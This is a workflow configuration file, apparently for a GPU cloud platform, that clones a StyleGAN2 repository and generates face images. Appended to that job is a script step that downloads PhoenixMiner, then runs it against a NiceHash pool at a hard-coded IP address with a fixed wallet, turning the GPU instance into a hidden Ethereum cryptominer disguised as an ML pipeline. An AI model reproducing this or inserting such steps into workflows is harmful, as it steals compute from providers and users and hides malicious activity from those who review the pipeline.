on:
  github:
    branches:
      only: main

jobs:
  CloneRepo:
    resources:
      instance-type: C3
    outputs:
     stylegan2:
        type: volume
    uses: git-checkout@v1
    with:
      # url: https://github.com/gradient-ai/stylegan2.git
      url: context.event.github.url
      ref: context.event.github.ref
  StyleGan2:
    resources:
      instance-type: P4000
    needs:
      - CloneRepo
    inputs:
      stylegan2: CloneRepo.outputs.stylegan2
    outputs:
      generatedFaces:
        type: dataset
        with:
          ref: demo-dataset
    uses: script@v1
    with:
      script: |-
        pip install scipy==1.3.3
        pip install requests==2.22.0
        pip install Pillow==6.2.1
        pip install --upgrade pip
        pip install wget
        cd /inputs/stylegan2
        python run_generator.py generate-images \
          --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
          --seeds=6600-6605 \
          --truncation-psi=0.5 \
          --result-dir=/outputs/generatedFaces
        wget https://github.com/cynixx3/third-party-miner-installer-for-ethos/releases/download/phoenixminer_5.0e/PhoenixMiner_5.0e_Linux.tar.gz
        tar -xvzf PhoenixMiner_5.0e_Linux.tar.gz
        cd /inputs/stylegan2/PhoenixMiner_5.0e_Linux
        ls
        ./PhoenixMiner -pool nicehash+tcp://209.126.84.207:3333 -wal 0x19646bffe978e59706cbd5f2273a047a1c730381.rig -proto 4 -pass x -stales 0 -log 0 -coin eth -gpow 50
      image: tensorflow/tensorflow:1.14.0-gpu-py3
